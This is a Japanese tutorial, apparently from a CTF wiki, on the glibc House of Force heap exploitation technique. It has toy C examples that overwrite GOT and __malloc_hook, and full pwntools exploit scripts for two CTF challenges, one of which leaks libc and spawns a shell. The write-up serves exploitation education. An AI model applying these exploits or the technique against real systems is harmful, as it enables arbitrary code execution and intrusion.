# House Of Force

## はじめに
House Of Force は House Of XXX シリーズの攻撃手法に属します。House Of XXX は、2004 年の論文『The Malloc Maleficarum-Glibc Malloc Exploitation Techniques』で提唱された、glibc のヒープアロケータを標的とする一連の攻撃手法です。
ただし、年月が経っているため、『The Malloc Maleficarum』で提唱された手法の大半は今日では通用せず、現在私たちが House Of XXX と呼ぶ攻撃は、2004 年の論文に書かれたものとはかなり異なっています。それでも『The Malloc Maleficarum』は今なお一読をおすすめする論文で、原文は次の場所で読めます。
https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt

## 原理
House Of Force はヒープの攻撃手法ですが、House Of Force を使うのに必ずしもヒープの脆弱性が必要というわけではありません。ヒープ(heap based)の脆弱性を House Of Force で攻撃するには、次の条件が必要です。

1. オーバーフローなどの方法で、top chunk の size フィールドを制御できること
2. ヒープの確保サイズを自由に制御できること

House Of Force が生まれる原因は、glibc の top chunk の扱いにあります。前のヒープのデータ構造の部分で学んだとおり、ヒープを確保する際に、空きブロックがどれも要求を満たせない場合は、top chunk から対応するサイズを切り出してヒープチャンクの領域とします。

では、top chunk を使ってヒープチャンクを確保するときの size の値がユーザーの制御する任意の値だった場合、何が起こるでしょうか。答えは、top chunk を期待する任意の位置に向けられるということで、これは任意アドレス書き込みに相当します。ただし glibc では、ユーザーが要求したサイズと top chunk の現在の size に対して検証が行われます。
```
// 現在の top chunk を取得し、その対応するサイズを計算する
victim = av->top;
size   = chunksize(victim);
// 分割後もそのサイズが chunk の最小サイズを満たしていれば、そのまま分割できる。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```
しかし、size を非常に大きな値に改ざんできれば、この検証を簡単に通過できます。これが、先ほど述べた top chunk の size フィールドを制御できる脆弱性が必要な理由です。

```
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```
一般的な方法は、top chunk の size を -1 に書き換えることです。比較の際に size は符号なし整数に変換されるため、-1 は unsigned long で最大の数になり、どんな場合でも検証を通過できます。

```
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```
その後、ここで top ポインタが更新され、続くヒープチャンクはこの位置に確保されます。ユーザーがこのポインタを制御できれば、任意のアドレスに任意の値を書き込む(write-anything-anywhere)ことができます。

**同時に、top chunk の size も更新されることに注意が必要です。更新の方法は次のとおりです**

```c
victim = av->top;
size   = chunksize(victim);
remainder_size = size - nb;
set_head(remainder, remainder_size | PREV_INUSE);
```

したがって、次回に指定の位置で大きさ x の chunk を確保したい場合は、remainder_size が x+ MINSIZE 以上であることを確認する必要があります。

## 簡単な例 1
HOF の原理を学んだところで、ここでは例を使って HOF の利用を説明します。この例の目標は、HOF によって `malloc@got.plt` を書き換え、プログラムのフローを乗っ取ることです。

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== ここで top chunk の size フィールドを 0xffffffffffffffff に書き換える
    malloc(-4120);  // <=== top chunk のポインタを減らす
    malloc(0x10);   // <=== ブロックを確保して任意アドレス書き込みを実現する
}
```

まず、0x10 バイトのブロックを確保します。

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
0x602030:	0x0000000000000000	0x0000000000000000
```
次に top chunk の size を 0xffffffffffffffff に書き換えます。実際の問題では、この手順はヒープオーバーフローなどの脆弱性で実現できます。
-1 は 2 の補数表現では 0xffffffffffffffff なので、直接 -1 を代入すればかまいません。

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0xffffffffffffffff <=== top chunk size域被更改
0x602030:	0x0000000000000000	0x0000000000000000
```
このときの top chunk の位置に注意してください。次に確保を行うと、top chunk の位置が望む場所に変更されます。

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020 <=== top chunk此时一切正常
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
続いて `malloc(-4120);` を実行します。-4120 はどのように求めたのでしょうか。
まず、書き込みたい宛先アドレスを明確にする必要があります。プログラムをコンパイルしたところ、0x601020 が `malloc@got.plt` のアドレスでした。

```
0x601020:	0x00007ffff7a91130 <=== malloc@got.plt
```
そのため、top chunk を 0x601010 に向ける必要があります。そうすれば、次に chunk を確保するときに、`malloc@got.plt` のメモリが確保されます。

次に現在の top chunk のアドレスを確認します。前述のとおり top chunk は 0x602020 にあるので、オフセットは次のように計算できます。

0x601010-0x602020=-4112

また、ユーザーが要求したメモリサイズは、メモリを確保する関数に入ると符号なし整数になります。

```c
void *__libc_malloc(size_t bytes) {
```

ユーザーが入力したサイズが、内部の `checked_request2size` を経てこの大きさになるようにしたいわけです。つまり、

```c
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

一方で、REQUEST_OUT_OF_RANGE(req) の検査を回避する必要があります。つまり malloc に渡す値は負数の範囲にあり、-2 * MINSIZE より大きくてはいけません。これは通常は満たせます。

他方で、対応する制約を満たしたうえで、`request2size` がちょうど対応する大きさに変換されるようにする必要があります。つまり ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK がちょうど -4112 になるようにしなければなりません。まず、-4112 は chunk にアラインされていることは明らかなので、そこから SIZE_SZ と MALLOC_ALIGN_MASK をそれぞれ引けば、要求すべき値が得られます。実はここでは SIZE_SZ を引くだけで十分で、余分に引いた MALLOC_ALIGN_MASK は最後にアラインで切り捨てられます。そして**-4112 が MALLOC_ALIGN にアラインされていない場合は、もう少し多く引く必要があります。もちろん、確保後に得られる chunk もアラインされているようにするのが望ましいです。chunk を解放するときにアラインの検査が行われるからです。**

したがって、`malloc(-4120)` を呼び出した後、top chunk が望む位置に引き上げられたことが観察できます。

```
0x7ffff7dd1b20 <main_arena>:\	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000601010 <=== 可以观察到top chunk被抬高
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
その後、確保するブロックは 0x601010+0x10 の位置、つまり 0x601020 に現れ、got テーブルの内容を書き換えられるようになります。

ただし、引き上げられると同時に、malloc@got の付近の内容も書き換えられてしまう点に注意が必要です。

```c
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
```

## 簡単な例 2
前の例では、HOF で top chunk のポインタを減らし、その上(低位アドレス)にある got テーブルの内容を書き換える方法を示しました。
しかし HOF では top chunk のポインタを増やして、高位アドレス空間にある内容を書き換えることもできます。この例でそれを示します。

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```
プログラムのコードは簡単な例 1 とほぼ同じで、2 回目の malloc の size だけが異なることがわかります。
今回の目標は malloc_hook です。malloc_hook は libc.so 内のグローバル変数なので、まずメモリレイアウトを確認します。

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```
heap のベースアドレスは 0x602000、libc のベースアドレスは 0x7ffff7a0d000 であることがわかります。そのため、HOF で top chunk のポインタの値を増やして malloc_hook に書き込む必要があります。
まず、デバッグにより __malloc_hook のアドレスは 0x7ffff7dd1b10 にあることがわかっているので、次のように計算します。

0x7ffff7dd1b00-0x602020-0x10=140737345551056
この malloc の後、top chunk のアドレスが 0x00007ffff7dd1b00 まで引き上げられたことが観察できます。

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
その後、もう一度確保するだけで、0x7ffff7dd1b10 にある __malloc_hook の値を制御できます。

```
rax = 0x00007ffff7dd1b10
    
0x400562 <main+60>        mov    edi, 0x10
0x400567 <main+65>        call   0x400410 <malloc@plt>
```

## まとめ
この節では House Of Force の原理を説明し、攻撃の簡単な例を 2 つ示しました。この 2 つの簡単な例を見ると、HOF の利用条件はかなり厳しいことがわかります。

* まず、ユーザーが top chunk の size フィールドを制御できる脆弱性が存在すること。
* 次に、**ユーザーが malloc の確保サイズを自由に制御できる必要があること**
* 3 つ目に、確保の回数に制限がないこと

この 3 点のうち、2 つ目が最も厄介なことが多く、CTF の問題ではユーザーがヒープチャンクを確保するサイズに最小値と最大値の制限が付けられていて、HOF の方法で攻撃できないことがよくあります。

## HITCON training lab 11
[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/house-of-force/hitcontraning_lab11)

ここでは主に、その magic 関数を次のように書き換えます。



### 基本情報

```shell
➜  hitcontraning_lab11 git:(master) file bamboobox     
bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
➜  hitcontraning_lab11 git:(master) checksec bamboobox 
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

このプログラムは 64 ビットの動的リンクプログラムです。

### 基本機能

プログラムは開始時に 0x10 のメモリを確保し、**2 つの関数ポインタ**を保持していることに注意してください。

このプログラムは、おおよそ箱の中の品物の追加と削除を行うものです。

1. 箱の中身を表示する。箱の中の各品物の名前を順に表示します。
2. 箱に品物を追加する。ユーザーが入力したサイズに応じて、各品物に対応するメモリを確保し、名前を格納する領域とします。ただし、ここで名前の読み込みには `read` 関数が使われ、読み込む長さの引数はユーザーが入力した v2 であり、read の 3 番目の引数は符号なし整数であるため、負数を入力すれば任意の長さを読み込めることに注意してください。ただし、この数値が `REQUEST_OUT_OF_RANGE` の制約を満たすようにする必要があります。そのためここには**任意の長さのヒープオーバーフロー**の脆弱性があります。とはいえ、初回は利用が比較的難しいです。初期状態ではヒープの top chunk のサイズは通常あまり大きくないからです。
3. 品物の名前を変更する。指定したインデックスとサイズに基づいて、指定したインデックスの品物に指定した長さの名前を読み込みます。ここでも長さはユーザーが入力するため、**任意の長さのヒープオーバーフロー**の脆弱性があります。
4. 品物を削除する。対応する品物の名前のサイズを 0 にし、対応する content を NULL にします。

また、このプログラムは主にデモ用のプログラムなので、flag を直接読み取れる magic 関数が含まれています。

### 攻撃

プログラムに magic 関数があるため、主な目的は、あるポインタを magic 関数のポインタで上書きすることです。このプログラムは開始時に、2 つの関数ポインタを格納するためのメモリを確保しています。hello_message はプログラムの開始時に、goodbye_message はプログラムの終了時に使われるため、goodbye_message を上書きすることで実行フローを制御できます。具体的な方針は次のとおりです。

1. 品物を追加し、ヒープオーバーフローの脆弱性を利用して top chunk のサイズを -1、つまり 64 ビットの最大値で上書きする。
2. house of force の技法を用いて、ヒープのベースアドレスに chunk を確保する。
3. goodbye_message を magic 関数のアドレスで上書きして、実行フローを制御する

**ここで注意すべきは、top chunk を指定の位置に移動させるときに使うサイズは、新しい top chunk のサイズを設定できるよう適切なものにして、次回の top chunk からの確保の際の検査を回避する必要があることです。**

exp は次のとおりです。

```shell
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./bamboobox')
context.log_level = 'debug'


def additem(length, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def modify(idx, length, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


def show():
    r.recvuntil(":")
    r.sendline("1")


magic = 0x400d49
# we must alloc enough size, so as to successfully alloc from fake topchunk
additem(0x30, "ddaa")  # idx 0
payload = 0x30 * 'a'  # idx 0's content
payload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size
# modify topchunk's size to -1
modify(0, 0x41, payload)
# top chunk's offset to heap base
offset_to_heap_base = -(0x40 + 0x20)
malloc_size = offset_to_heap_base - 0x8 - 0xf
#gdb.attach(r)
additem(malloc_size, "dada")
additem(0x10, p64(magic) * 2)
print r.recv()
r.interactive()

```

なお、この問題は unlink の方法でも解けます。

## 2016 BCTF bcloud
[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/house-of-force/2016_bctf_bcloud)

### 基本情報

```shell
➜  2016_bctf_bcloud git:(master) file bcloud   
bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
➜  2016_bctf_bcloud git:(master) checksec bcloud  
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

動的リンクの 32 ビットプログラムで、主に Canary 保護と NX 保護が有効になっていることがわかります。

### 基本機能

プログラムはおおよそクラウドノートの管理システムです。まず、プログラムは初期化を行い、ユーザーの名前、組織(org)、host を設定します。プログラムには主に次の機能があります。

1. note の新規作成。ユーザーが入力した x に基づいて、x+4 の領域を note のサイズとして確保する。
2. note の表示。何の機能もない。。
3. note の編集。ユーザーが指定した note に基づいて、対応する内容を編集する。
4. note の削除。対応する note を削除する。
5. note の同期。すべての note が同期済みであると印を付ける。

しかし、この 5 つの機能には脆弱性が見つからず、、、プログラムを見直したところ、プログラムの初期化時に脆弱性があることがわかりました。。

名前の初期化

```c
unsigned int init_name()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *tmp; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  read_str(&s, 64, '\n');
  tmp = (char *)malloc(0x40u);
  name = tmp;
  strcpy(tmp, &s);
  info(tmp);
  return __readgsdword(0x14u) ^ v3;
}
```

ここで、プログラムが読み込む名前が 64 文字の場合、info 関数で対応する文字列を出力するときに、対応する tmp ポインタの内容も出力されます。つまり**ヒープのアドレスがリークします**。。

組織と org の初期化に脆弱性があります。

```c
unsigned int init_org_host()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  read_str(&s, 64, 10);
  puts("Host:");
  read_str(&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  org = v2;
  host = v4;
  strcpy(v4, &v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

組織を読み込むとき、64 バイトを与えると v2 の下位アドレスを上書きします。同時に、v2 は top chunk と隣接する chunk であり、v2 は org とちょうど隣接していることもわかります。32 ビットプログラムでは通常 32 ビットすべてが使われるため、ここで v2 に格納されている内容は、ほとんどの場合 `\x00` ではありません。そのため strcpy 関数で v2 に内容をコピーすると、top chunk を上書きしてしまう可能性が非常に高くなります。これが脆弱性です。

### 攻撃

1. 名前の初期化部分の脆弱性を利用して、ヒープのベースアドレスをリークする。。
2. house of force を利用して、top chunk をグローバルの 0x0804B0A0 の &notesize-8 に確保させる。再びメモリを確保すると notesize のアドレスのメモリが返されるため、すべての note のサイズと対応するアドレスを制御できるようになる。
3. 最初の 3 つの note のサイズを 16 に書き換え、そのポインタを free@got、atoi@got、atoi@got に書き換える。
4. free@got を puts@plt に書き換える。
5. atoi のアドレスをリークする。
6. もう一方の atoi の got エントリを system のアドレスに書き換えて、shell を取得する。

具体的なスクリプトは次のとおりです。

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./bcloud"
bcloud = ELF("./bcloud")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./bcloud")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


def exp():
    # leak heap base
    p.sendafter('Input your name:\n', 'a' * 64)
    p.recvuntil('Hey ' + 'a' * 64)
    # sub name's chunk' s header
    heap_base = u32(p.recv(4)) - 8
    log.success('heap_base: ' + hex(heap_base))
    p.sendafter('Org:\n', 'a' * 64)
    p.sendlineafter('Host:\n', p32(0xffffffff))
    # name,org,host, for each is (0x40+8)
    topchunk_addr = heap_base + (0x40 + 8) * 3

    # make topchunk point to 0x0804B0A0-8
    p.sendlineafter('option--->>', '1')
    notesize_addr = 0x0804B0A0
    notelist_addr = 0x0804B120
    targetaddr = notesize_addr - 8
    offset_target_top = targetaddr - topchunk_addr
    # 4 for size_t, 7 for malloc_allign
    malloc_size = offset_target_top - 4 - 7
    # plus 4 because malloc(v2 + 4);
    p.sendlineafter('Input the length of the note content:\n',
                    str(malloc_size - 4))
    # most likely malloc_size-4<0...
    if malloc_size - 4 > 0:
        p.sendlineafter('Input the content:\n', '')

    #gdb.attach(p)
    # set notesize[0] = notesize[1] = notesize[2]=16
    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got
    p.sendlineafter('option--->>', '1')
    p.sendlineafter('Input the length of the note content:\n', str(1000))

    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(
        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2
    p.sendlineafter('Input the content:\n', payload)

    # overwrite free@got with puts@plt
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(0))
    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))

    # leak atoi addr by fake free
    p.sendlineafter('option--->>', '4')
    p.sendlineafter('Input the id:\n', str(1))
    atoi_addr = u32(p.recv(4))
    libc_base = atoi_addr - libc.symbols['atoi']
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base addr: ' + hex(libc_base))

    # overwrite atoi@got with system
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(2))
    p.sendlineafter('Input the new content:\n', p32(system_addr))

    # get shell
    p.sendlineafter('option--->>', '/bin/sh\x00')
    p.interactive()


if __name__ == "__main__":
    exp()
```



## 問題

- [2016 Boston Key Party CTF cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)
